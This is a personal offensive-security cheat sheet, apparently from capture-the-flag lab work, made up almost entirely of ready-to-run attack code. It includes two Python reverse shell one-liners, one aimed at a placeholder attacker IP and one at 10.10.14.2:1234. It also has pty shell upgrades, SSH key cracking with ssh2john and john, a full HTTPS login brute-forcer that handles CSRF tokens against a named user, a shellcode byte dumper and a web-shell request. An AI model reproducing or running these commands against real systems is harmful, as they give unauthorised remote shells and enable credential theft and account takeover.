# proxies in script
```python
proxies = {'http':'http://127.0.0.1:8080'}
r2 = requests.get(WEB_SHELL, params=command, verify=False, proxies=proxies)
```


# Python Reverse Shell  
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
# Bash jump  
python -c 'import pty;pty.spawn("/bin/bash")'  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
  
base64.b64encode('A string'.encode('UTF-8')).decode('ascii')  
  
python ssh2john.py id_rsa > john.txt  
ssh2john id_rsa > brainfuck.txt  
john john.txt --wordlist=/usr/share/wordlists/rockyou.txt  
john brainfuck.txt --wordlist=/usr/share/wordlists/rockyou.txt  
#####################HTTPS POST BRUTE############################  
import requests  
from requests.packages.urllib3.exceptions import InsecureRequestWarning  
import re  
  
re_csrf = 'csrfMagicToken = "(.*?)"'  
  
s = requests.session()  
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  
lines = open('passwords.txt')  
for password in lines:  
    r = s.post('https://10.10.10.60/index.php', verify=False)  
    csrf = re.findall(re_csrf, r.text)[0]  
    login = {'__csrf_magic': csrf, 'usernamefld': 'rohit', 'passwordfld': password[:-1], 'login': 'Login'}  
    r = s.post('https://10.10.10.60/index.php', data=login, verify=False)  
    if "Dashboard" in r.text:  
        print("Valid login: %s@%s " % ("rohit", password[:-1]))  
        s.cookies.clear()  
    else:  
        print("Failed: %s@%s" % ("rohit", password[:-1]))  
        s.cookies.clear()  
################################################################  
file = open("etc.bin", "rb")  
byte = file.read(1)  
while byte:  
  print("\\x"+byte.hex(), end="")  
  byte = file.read(1)  
file.close()  
^Generate shellcode bytes from file  
#################################################################  
#reverse shell  
exec python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.2",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'